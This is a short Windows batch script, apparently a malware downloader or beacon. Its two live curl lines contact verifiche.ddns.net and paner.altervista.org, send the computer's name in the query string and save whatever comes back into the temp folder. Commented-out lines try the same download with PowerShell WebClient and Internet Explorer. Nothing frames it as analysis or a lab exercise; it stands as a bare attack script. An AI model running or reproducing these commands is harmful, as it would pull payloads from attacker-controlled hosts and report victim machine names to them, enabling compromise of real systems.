rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/svc/wup.php?pc=%computername%_1','%temp%\%computername%_1')
rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://paner.altervista.org/svc/wup.php?pc=%computername%_1','%temp%\%computername%_2')
curl http://verifiche.ddns.net/svc/wup.php?pc=%computername%_1 -o %temp%\%computername%_1
curl http://paner.altervista.org/svc/wup.php?pc=%computername%_1 -o %temp%\%computername%_2
rem "%ProgramFiles%\Internet Explorer\iexplore.exe" http://verifiche.ddns.net/svc/wup.php?pc=%computername%_ie